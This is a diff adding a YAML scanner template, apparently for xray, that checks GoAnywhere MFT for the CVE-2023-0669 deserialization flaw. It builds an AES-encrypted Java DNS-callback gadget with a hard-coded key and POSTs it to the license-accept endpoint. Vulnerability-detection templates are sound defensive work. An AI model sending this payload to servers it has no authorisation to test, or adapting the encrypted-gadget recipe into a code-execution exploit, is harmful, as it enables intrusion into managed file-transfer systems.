@@ -1,0 +1,23 @@
+id: poc-yaml-goanywhere-mft-LicenseResponseServlet-deserialization
+info:
+  name: GoAnywhere MFT 反序列化漏洞 （CVE-2023-0669）
+  severity: critical
+  tags:
+  - CVE-2023-0669
+  - DNSLOG
+  - 两高一弱
+  finger: GoAnywhere MFT
+variables:
+  reverse: new_dns_log()
+  reverseUrl: reverse.Url()
+  postdata: concat(urlencode(base64(ase_cbc_encrypt_with_iv(java_dns_url_gadget(reverseUrl,"raw"),base64_decode("Dmmjg5tuz0Vkm4YfSicXG2aHDJVnpBROuvPVL9xAZMo="),
+    base64_decode("QUVTL0NCQy9QS0NTNVBhZA==")))),"$2")
+requests:
+- method: POST
+  path: /goanywhere/lic/accept
+  headers:
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+  data: bundle={{.postdata}}
+  expression: status_code == 500 && reverse.Sleep(3)
+transport: http
